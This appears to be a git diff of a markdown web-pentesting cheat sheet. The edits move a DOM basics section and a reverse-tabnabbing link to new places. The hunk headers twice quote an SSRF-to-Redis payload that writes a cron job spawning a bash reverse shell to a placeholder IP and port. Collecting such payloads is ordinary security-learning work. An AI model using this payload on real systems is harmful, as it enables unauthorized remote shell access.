@@ -483,6 +483,15 @@ dict://127.0.0.1:6379/set -.- "\n\n\n* * * * * bash -i >\x26 /dev/tcp/<ip>/<port
 - https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy
 - https://nathandavison.com/blog/corsing-a-denial-of-service-via-cache-poisoning
 
+### DOM - notions
+
+![https://www.w3schools.com/js/js_htmldom.asp](./images/dom.gif)
+
+- `document.getElementById`
+- `document.innerHTML`
+- `Hash (#)`: https://www.w3schools.com/jsref/tryit.asp?filename=tryjsref_loc_hash
+- `getElements` https://www.w3schools.com/js/tryit.asp?filename=tryjs_dom_getelementsbytagname
+
 ### Challenges
 
 - https://alert.zeyu2001.com/
@@ -509,25 +518,6 @@ dict://127.0.0.1:6379/set -.- "\n\n\n* * * * * bash -i >\x26 /dev/tcp/<ip>/<port
 ```
 Header Set-Cookie: mettre le scope de l'attribut SameSite = None
 ```
-
-## DOM - notions
-
-![https://www.w3schools.com/js/js_htmldom.asp](./images/dom.gif)
-
-- `document.getElementById`
-- `document.innerHTML`
-
-`Hash (#)`
-
-- https://www.w3schools.com/jsref/tryit.asp?filename=tryjsref_loc_hash
-
-`getElements`
-
-- https://www.w3schools.com/js/tryit.asp?filename=tryjs_dom_getelementsbytagname
-
-## Reverse Tabnabbing
-
-- https://book.hacktricks.xyz/pentesting-web/reverse-tab-nabbing
 
 ## XSS
 
@@ -600,6 +590,11 @@ python -m pyftpdlib -D
 
 - https://swisskyrepo.github.io/PayloadsAllTheThings/Client%20Side%20Path%20Traversal/#cspt-to-xss
 - https://swisskyrepo.github.io/PayloadsAllTheThings/Client%20Side%20Path%20Traversal/#cspt-to-csrf
+
+
+## Reverse Tabnabbing
+
+- https://book.hacktricks.xyz/pentesting-web/reverse-tab-nabbing
 
 ## Browser Cache
 
